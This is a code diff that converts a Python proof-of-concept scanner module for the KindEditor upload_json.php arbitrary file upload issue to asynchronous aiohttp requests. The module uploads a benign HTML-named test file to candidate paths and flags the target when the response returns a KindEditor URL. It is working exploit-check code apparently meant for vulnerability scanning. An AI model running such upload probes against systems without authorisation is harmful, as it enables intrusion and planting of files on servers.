@@ -3,6 +3,8 @@
 # @author: 'orleven'
 
 import json
+from aiohttp import FormData
+from lib.utils.connect import ClientSession
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -16,22 +18,30 @@ class POC(Script):
         self.refer = 'https://github.com/kindsoft/kindeditor/issues/249'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             path_list = list(set([
                 self.url_normpath(self.base_url, '/'),
                 self.url_normpath(self.url, './'),
                 self.url_normpath(self.url, '../'),
             ]))
-            for path in path_list:
-                try:
+            async with ClientSession() as session:
+                for path in path_list:
                     url = path + "kindeditor/php/upload_json.php?dir=file"
-                    files = {"imgFile": ('mytestforyou.html', "this is a test for you. ", "text/plain")}
-                    res = json.loads(self.curl('post',url, files=files))
-                    if 'url'in res.keys() and 'kindeditor' in res['url']:
-                        self.flag = 1
-                        self.req.append({"url": url})
-                        self.res.append({"info": url, "key": url})
-                except:
-                    pass
+                    data = FormData()
+                    data.add_field('imgFile',
+                                   "this is a test for you. ",
+                                   filename='mytestforyou.html',
+                                   content_type='text/plain')
+                    async with session.post(url=url, data=data) as res:
+                        if res!=None:
+                            text = await res.text()
+                            try:
+                                res = json.loads(text)
+                                if 'url'in res.keys() and 'kindeditor' in res['url']:
+                                    self.flag = 1
+                                    self.req.append({"url": url})
+                                    self.res.append({"info": url, "key": url})
+                            except:
+                                pass
